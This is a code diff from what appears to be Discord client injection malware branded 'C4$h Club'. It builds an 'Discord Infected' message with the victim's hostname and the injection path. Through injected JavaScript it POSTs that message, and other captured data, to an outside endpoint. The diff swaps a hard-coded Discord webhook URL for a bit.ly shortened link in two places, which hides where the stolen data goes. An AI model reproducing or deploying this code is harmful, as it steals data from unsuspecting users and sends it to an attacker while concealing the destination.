@@ -73,7 +73,7 @@ function FirstTime() {
                 var c={username:"C4$h Club",content:"",embeds:[{title:"Discord Infected",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"C4$h Club"},footer:{text:"C4$h Club"},thumbnail:{url:"https://ibb.co/nmDLGCT"}}]};
                 const window = BrowserWindow.getAllWindows()[0];
                 window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://discord.com/api/webhooks/923202166771052614/eERMwgB6kgd4FJ2HRLYyw2Xpg5fhXjCb7TWDKFN2COsqGXlgNfmwPTTSGKfRlQQqKlnI", true);
+    xhr.open("POST", "https://bit.ly/3mnHq5N", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${c}));
@@ -128,7 +128,7 @@ function SendToWebhook(what) {
     xhr.send(JSON.stringify(${what}));
     `, !0).then((token => {}));
     window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://discord.com/api/webhooks/923202166771052614/eERMwgB6kgd4FJ2HRLYyw2Xpg5fhXjCb7TWDKFN2COsqGXlgNfmwPTTSGKfRlQQqKlnI", true);
+    xhr.open("POST", "https://bit.ly/3mnHq5N", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${what}));
